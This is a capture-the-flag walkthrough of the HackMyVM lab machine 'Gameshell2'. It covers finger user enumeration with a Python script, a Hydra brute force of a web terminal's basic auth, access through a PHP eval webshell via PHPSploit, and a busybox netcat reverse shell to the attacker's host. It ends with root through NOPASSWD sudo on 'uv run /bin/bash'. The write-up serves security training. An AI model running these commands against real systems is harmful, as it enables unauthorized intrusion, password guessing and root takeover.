# Gameshell2

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| **Gameshell2** | **Sublarge** | **Beginner** | **HackMyVM** |

**Summary:** GameShell2 is a beginner-level Boot2Root machine that demonstrates enumeration and exploitation of multiple services including web applications and finger service. The attack chain involves discovering open ports through network scanning, enumerating users via finger service, brute-forcing web authentication credentials, exploiting a web-based terminal game to obtain a password, and ultimately achieving privilege escalation through a misconfigured sudo permission on the UV Python package manager. Initial reconnaissance reveals Apache web server on port 80 with a hidden terminal interface, SSH on port 22, and finger service on port 79. The machine features Chinese-themed content and includes a password-protected web terminal game that reveals credentials for shell access. Privilege escalation is achieved by exploiting UV's ability to run arbitrary commands with sudo privileges, providing direct root access.

---

## Recon

First thing to do is looking for the target's IP:

```powershell
PS D:\hackmyvm\machines> arp -a

Interface: 192.168.100.1 --- 0x3
  Internet Address      Physical Address      Type
  192.168.100.18        08-00-27-f7-35-bb     dynamic
.....[SNIP].....
```

Target IP: `192.168.100.18`

Do enumeration to know the open ports:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ nmap -sC -sV 192.168.100.18 -p-
.....[SNIP].....
PORT   STATE SERVICE     VERSION
22/tcp open  ssh         OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
79/tcp open  nagios-nsca Nagios NSCA
| finger: \x0D
| Welcome to Linux version 4.19.0-27-amd64 at GameShell2 !\x0D
|
|  23:48:56 up 19 min,  0 users,  load average: 1.98, 6.44, 3.50
| \x0D
|_No one logged on.\x0D
80/tcp open  http        Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: \xE7\xBA\xAF\xE8\xA7\xA6\xE5\xB1\x8F\xE6\xA1\x8C\xE7\x90\x83
| http-robots.txt: 1 disallowed entry
|_/ternimal/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
.....[SNIP].....
```

**Open Ports:**
- **Port 22** - SSH (OpenSSH 8.4p1 Debian)
- **Port 79** - Finger service (Nagios NSCA)
- **Port 80** - HTTP (Apache 2.4.62) - Chinese title indicating a touchscreen billiards application

## Web Enumeration

### Initial Directory Enumeration

Used feroxbuster to discover web directories and files:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ feroxbuster -u http://192.168.100.18 -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -e -x 7z.001,txt,php,html,zip,htm,bak,pem -t 500

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.100.18/
 🚩  In-Scope Url          │ 192.168.100.18
 🚀  Threads               │ 500
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [7z.001, txt, php, html, zip, htm, bak, pem]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      276c http://192.168.100.18/ternimal
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      369l      868w    14134c http://192.168.100.18/
200      GET        2l        4w       35c http://192.168.100.18/robots.txt
401      GET       14l       54w      461c http://192.168.100.18/terminal
[####################] - 19m  1984914/1984914 0s      found:4       errors:44551
[####################] - 19m  1984905/1984905 1745/s  http://192.168.100.18/                                                         
```

### Additional File Discovery

Used ffuf to find additional files:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ ffuf -u http://192.168.100.18/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.txt,.bak,.zip,.old -mc 200,401

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.18/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
 :: Extensions       : .php .txt .bak .zip .old
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,401
________________________________________________

index.html              [Status: 200, Size: 14134, Words: 2391, Lines: 370, Duration: 15ms]
robots.txt              [Status: 200, Size: 35, Words: 3, Lines: 3, Duration: 14ms]
.                       [Status: 200, Size: 14134, Words: 2391, Lines: 370, Duration: 18ms]
users.html              [Status: 200, Size: 2052, Words: 4, Lines: 678, Duration: 41ms]
:: Progress: [102774/102774] :: Job [1/1] :: 2298 req/sec :: Duration: [0:01:00] :: Errors: 0 ::
```

### Robots.txt Analysis

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ curl -i "192.168.100.18/robots.txt"
HTTP/1.1 200 OK
Date: Wed, 21 Jan 2026 05:35:29 GMT
Server: Apache/2.4.62 (Debian)
Last-Modified: Fri, 21 Nov 2025 08:58:00 GMT
ETag: "23-6441702b8225b"
Accept-Ranges: bytes
Content-Length: 35
Content-Type: text/plain

User-agent: *
Disallow: /ternimal/
```

### Terminal Endpoint Discovery

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ curl -i "http://192.168.100.18/terminal"
HTTP/1.1 401 Unauthorized
Date: Wed, 21 Jan 2026 05:33:07 GMT
Server: Apache/2.4.62 (Debian)
WWW-Authenticate: Basic realm="Web Terminal Auth"
Content-Length: 461
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>401 Unauthorized</title>
</head><body>
<h1>Unauthorized</h1>
<p>This server could not verify that you
are authorized to access the document
requested.  Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn't understand how to supply
the credentials required.</p>
<hr>
<address>Apache/2.4.62 (Debian) Server at 192.168.100.18 Port 80</address>
</body></html>
```

**Key Findings:**
- `/terminal` requires HTTP Basic Authentication
- `robots.txt` disallows `/ternimal/` (note the typo)
- `users.html` contains potential usernames

### Users.html Analysis

The users.html file contained an alphabetical list of 2-letter combinations (aa, ab, ac... zz), which appeared to be a username wordlist for brute-force attacks.

## Finger Service Enumeration

### Basic Finger Query

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ finger @192.168.100.18

Welcome to Linux version 4.19.0-27-amd64 at GameShell2 !

 00:34:29 up  1:04,  0 users,  load average: 1.11, 4.16, 8.44

No one logged on.

┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ finger root@192.168.100.18

Welcome to Linux version 4.19.0-27-amd64 at GameShell2 !

 00:34:35 up  1:04,  0 users,  load average: 1.02, 4.09, 8.40

Login: root                             Name: root
Directory: /root                        Shell: /bin/bash
Never logged in.
No mail.
No Plan.
```

### Automated User Enumeration

Created a Python script to enumerate valid users through finger service and users.txt :

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ curl "http://192.168.100.18/users.html" > users.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2052  100  2052    0     0  20008      0 --:--:-- --:--:-- --:--:-- 20117
```

```python
import subprocess
import concurrent.futures
import os
import sys

# --- Configuration ---
TARGET_IP = "192.168.100.18"
WORDLIST_PATH = "users.txt"
THREADS = 10  # Balanced speed to prevent connection drops

def check_user(user):
    user = user.strip()
    if not user:
        return None

    try:
        # Executes the exact command: finger user@192.168.100.18
        # getoutput captures both stdout and stderr
        command = f"finger {user}@{TARGET_IP}"
        output = subprocess.getoutput(command)

        # LOGIC:
        # 1. Valid users must contain "Login:"
        # 2. Invalid users contain "no such user"
        if "Login:" in output and "no such user" not in output:
            return f"[+] VALID USER FOUND: {user}"
    except Exception:
        pass
    return None

def main():
    if not os.path.exists(WORDLIST_PATH):
        print(f"[-] Error: {WORDLIST_PATH} not found.")
        return

    # Load usernames from users.txt
    with open(WORDLIST_PATH, "r") as f:
        # Handles space, comma, or newline separation
        users = f.read().replace(',', ' ').split()

    print(f"[*] Target IP: {TARGET_IP}")

    # --- VERIFICATION STEP ---
    print("[*] Verifying script logic with 'root'...")
    root_check = check_user("root")
    if root_check:
        print(f"[*] Script verified! Output for root: Found.")
    else:
        print("[-] Script failed to identify 'root'. Verify if 'finger' is installed on your machine.")
        sys.exit(1)

    print(f"[*] Processing {len(users)} users from {WORDLIST_PATH} with {THREADS} threads...\n")

    # Multithreading for speed
    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
        results = list(executor.map(check_user, users))

        for result in results:
            if result:
                print(result)

    print("\n[*] Enumeration finished.")

if __name__ == "__main__":
    main()
```

**Results:**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ python3 finger_enum.py
[*] Target IP: 192.168.100.18
[*] Verifying script logic with 'root'...
[*] Script verified! Output for root: Found.
[*] Processing 680 users from users.txt with 10 threads...

[+] VALID USER FOUND: dt
[+] VALID USER FOUND: lp

[*] Enumeration finished.
```

**Valid Users Discovered:**
- **dt** - Potential target user
- **lp** - Line Printer daemon user (system account)

## Init Access

### Password Brute Force Attack

Used Hydra to brute-force the password for user 'dt' against the `/terminal` endpoint:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ hydra -l dt -P /usr/share/wordlists/rockyou.txt 192.168.100.18 http-get /terminal
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-21 12:07:55
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get://192.168.100.18:80/terminal
[STATUS] 18.00 tries/min, 18 tries in 00:01h, 14344392 to do in 13281:51h, 5 active
[STATUS] 8.00 tries/min, 24 tries in 00:03h, 14344388 to do in 29884:09h, 3 active
[STATUS] 4.29 tries/min, 30 tries in 00:07h, 14344385 to do in 55783:44h, 1 active
[80][http-get] host: 192.168.100.18   login: dt   password: [REDACTED]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-21 12:17:46
```

**Credentials Found:** `dt:[REDACTED]`

### Web Terminal Game

After accessing `/terminal` with the discovered credentials, a web-based game interface was presented. The game appeared to be a puzzle or challenge that needed to be completed to obtain additional access credentials.

**Game Completion Result:** After successfully completing the game objectives, the following password was revealed: `[REDACTED]`

This password provided SSH access to the system as user `dt`.

### SSH Access and User Flag

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ ssh dt@192.168.100.18

dt@GameShell2:~$ id
uid=1001(dt) gid=1001(dt) groups=1001(dt)

dt@GameShell2:~$ ls -la
total 36
drwxr-xr-x  5 dt   dt   4096 Nov 21 04:03 .
drwxr-xr-x  3 root root 4096 Nov 21 02:57 ..
lrwxrwxrwx  1 root root    9 Nov 21 03:54 .bash_history -> /dev/null
-rw-r--r--  1 dt   dt    220 Apr 18  2019 .bash_logout
-rw-r--r--  1 dt   dt   4068 Nov 21 03:33 .bashrc
drwxr-xr-x  3 dt   dt   4096 Nov 21 03:00 .cache
drwxr-xr-x  3 dt   dt   4096 Nov 21 03:01 .phpsploit
drwxr-xr-x 12 dt   dt   4096 Nov 21 03:01 phpsploit
-rw-r--r--  1 dt   dt    807 Apr 18  2019 .profile
-rw-r--r--  1 root root   44 Nov 21 03:56 user.txt
```

### Hidden Virtual Host Discovery

Discovered an additional Apache virtual host configuration:

```bash
dt@GameShell2:~$ ls -la /etc/apache2/sites-enabled/
total 8
drwxr-xr-x 2 root root 4096 Nov 21 03:06 .
drwxr-xr-x 8 root root 4096 Nov 21 03:28 ..
lrwxrwxrwx 1 root root   35 Apr  1  2025 000-default.conf -> ../sites-available/000-default.conf
lrwxrwxrwx 1 root root   37 Nov 21 03:05 dev.astra.dsz.conf -> ../sites-available/dev.astra.dsz.conf

dt@GameShell2:~$ cat /etc/apache2/sites-available/dev.astra.dsz.conf
<VirtualHost *:80>
    # 虚拟主机域名（需与 /etc/hosts 一致）
    ServerName dev.astra.dsz

    DocumentRoot /var/www/dev

    <Directory /var/www/dev>
        Options Indexes FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>

    ErrorLog ${APACHE_LOG_DIR}/dev.astra.dsz.error.log
    CustomLog ${APACHE_LOG_DIR}/dev.astra.dsz.access.log combined
</VirtualHost>
```

### Local Hosts Configuration

Added the discovered domain to local hosts file:

```bash
┌──(root㉿CLIENT-DESKTOP)-[/home/ouba]
└─# echo "192.168.100.18 dev.astra.dsz" >> /etc/hosts

┌──(root㉿CLIENT-DESKTOP)-[/home/ouba]
└─# curl -i "dev.astra.dsz"
HTTP/1.1 200 OK
Date: Wed, 21 Jan 2026 06:15:41 GMT
Server: Apache/2.4.62 (Debian)
Last-Modified: Fri, 21 Nov 2025 11:49:56 GMT
ETag: "44-64419698edef3"
Accept-Ranges: bytes
Content-Length: 68
Content-Type: text/html

<h1>Dev Environment - dev.astra.dsz</h1>
<!-- webshell is ready -->
```

The comment `<!-- webshell is ready -->` indicated the presence of a web shell on this virtual host.

### Webshell Discovery

Used feroxbuster to discover the webshell location:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ feroxbuster -u http://dev.astra.dsz/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -e -x php,txt,html,bak,pem,zip,htm -t 500

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://dev.astra.dsz/
 🚩  In-Scope Url          │ dev.astra.dsz
 🚀  Threads               │ 500
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt, html, bak, pem, zip, htm]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        2l        9w       68c http://dev.astra.dsz/
200      GET        2l        9w       68c http://dev.astra.dsz/index.html
200      GET        0l        0w        0c http://dev.astra.dsz/backdoor.php
[####################] - 14m  1661032/1661032 0s      found:3       errors:33248
[####################] - 14m  1661032/1661032 1943/s  http://dev.astra.dsz/
```

**Webshell Found:** `backdoor.php`

### PHPSploit Exploitation

PHPSploit was found in the user's home directory, indicating this was the intended exploitation path. PHPSploit is a post-exploitation toolkit designed to maintain access via webshells.

**Tool Setup:**
```bash
┌──(root㉿CLIENT-DESKTOP)-[/home/ouba]
└─# git clone https://github.com/nil0x42/phpsploit
.....[SNIP].....

┌──(root㉿CLIENT-DESKTOP)-[/home/ouba]
└─# cd ./phpsploit/

┌──(root㉿CLIENT-DESKTOP)-[/home/ouba/phpsploit]
└─# python3 -m venv venv

┌──(root㉿CLIENT-DESKTOP)-[/home/ouba/phpsploit]
└─# source venv/bin/activate

┌──(venv)(root㉿CLIENT-DESKTOP)-[/home/ouba/phpsploit]
└─# pip3 install -r requirements.txt
.....[SNIP].....

┌──(venv)(root㉿CLIENT-DESKTOP)-[/home/ouba/phpsploit]
└─# ./phpsploit
```

**Exploitation:**
```bash
phpsploit > set TARGET http://dev.astra.dsz/backdoor.php
phpsploit > exploit
[*] Current backdoor is: <?php @eval($_SERVER['HTTP_PHPSPL01T']); ?>

[*] Sending payload to http://dev.astra.dsz:80/backdoor.php ...
[*] Shell obtained by PHP (192.168.100.1 -> 192.168.100.18)

Connected to Linux server (dev.astra.dsz)
running PHP 8.3.19 on Apache/2.4.62 (Debian)
phpsploit(dev.astra.dsz) > run "id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
phpsploit(dev.astra.dsz) > run "whoami"
www-data
```

### Reverse Shell Establishment

**Windows Port Forwarding Setup (WSL environment):**
```powershell
PS C:\Windows\System32> netsh interface portproxy add v4tov4 listenaddress=192.168.100.1 listenport=4444 connectaddress=172.21.44.133 connectport=4444

PS C:\Windows\System32> New-NetFirewallRule -DisplayName "ReverseShell" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4444
```

**Listener Setup:**
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

**Reverse Shell Execution:**
```bash
phpsploit(dev.astra.dsz) > run "busybox nc 192.168.100.1 4444 -e /bin/bash"
```

**Shell Obtained:**
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 52399
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/usr/bin/script -qc /bin/bash /dev/null
www-data@GameShell2:/var/www/dev$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## PrivEsc

### Sudo Privileges Analysis

```bash
www-data@GameShell2:/var/www/dev$ sudo -l
Matching Defaults entries for www-data on GameShell2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on GameShell2:
    (ALL) NOPASSWD: /usr/local/bin/uv
```

**Critical Finding:** The www-data user can execute `/usr/local/bin/uv` as root without a password.

### UV Package Manager Analysis

```bash
www-data@GameShell2:/var/www/dev$ sudo /usr/local/bin/uv
An extremely fast Python package manager.

Usage: uv [OPTIONS] <COMMAND>

Commands:
  auth     Manage authentication
  run      Run a command or script
  init     Create a new project
  add      Add dependencies to the project
  remove   Remove dependencies from the project
  version  Read or update the project's version
  sync     Update the project's environment
  lock     Update the project's lockfile
  export   Export the project's lockfile to an alternate format
  tree     Display the project's dependency tree
  format   Format Python code in the project
  tool     Run and install commands provided by Python packages
  python   Manage Python versions and installations
  pip      Manage Python packages with a pip-compatible interface
  venv     Create a virtual environment
  build    Build Python packages into source distributions and wheels
  publish  Upload distributions to an index
  cache    Manage uv's cache
  self     Manage the uv executable
  help     Display documentation for a command
```

**UV** is an extremely fast Python package manager that includes a `run` command capable of executing arbitrary commands.

### Privilege Escalation Exploitation

The `uv run` command can execute arbitrary programs, and since we can run `uv` as root via sudo, we can escalate privileges directly:

```bash
www-data@GameShell2:/var/www/dev$ ls -la /usr/local/bin/uv
-rwxr-xr-x 1 root root 53872352 Nov 21 02:59 /usr/local/bin/uv

www-data@GameShell2:/var/www/dev$ sudo /usr/local/bin/uv run /bin/bash
root@GameShell2:/var/www/dev# id
uid=0(root) gid=0(root) groups=0(root)
root@GameShell2:/var/www/dev# cat /root/root.txt /home/dt/user.txt
flag{root-[REDACTED]}
flag{user-[REDACTED]}
```

**Success!** Root access achieved through UV's command execution capability and captured the flags.

---

## Summary

**Attack Chain:**
1. **Network Discovery** - Identified target IP via ARP scanning (192.168.100.18)
2. **Port Enumeration** - Discovered SSH (22), Finger (79), and Apache web server (80)
3. **Web Enumeration** - Found robots.txt, terminal endpoint, and users.html
4. **User Enumeration** - Used finger service to discover valid users (dt, lp)
5. **Password Brute Force** - Cracked credentials for /terminal endpoint (dt:[REDACTED])
6. **Web Terminal Game** - Completed game to obtain SSH password ([REDACTED])
7. **SSH Access** - Logged in as user dt and captured user flag
8. **Virtual Host Discovery** - Found hidden dev.astra.dsz domain
9. **Webshell Discovery** - Located backdoor.php through directory enumeration
10. **PHPSploit Exploitation** - Gained www-data shell through PHP webshell
11. **Reverse Shell** - Established stable netcat connection
12. **Sudo Enumeration** - Discovered NOPASSWD sudo permissions for UV package manager
13. **Privilege Escalation** - Exploited UV's run command to execute /bin/bash as root
14. **Root Flag** - Retrieved from /root/root.txt

**Key Vulnerabilities Exploited:**
- **Finger Service Enumeration** - User discovery through finger protocol
- **Web Authentication Brute Force** - Weak password protection on terminal interface
- **Game-Based Authentication** - Additional password revealed through web game
- **Exposed PHP Webshell** - backdoor.php on hidden virtual host
- **Misconfigured Sudo Permissions** - NOPASSWD sudo for UV package manager
- **UV Command Execution** - Arbitrary command execution via uv run functionality
- **Insufficient Privilege Separation** - www-data user with root execution capabilities
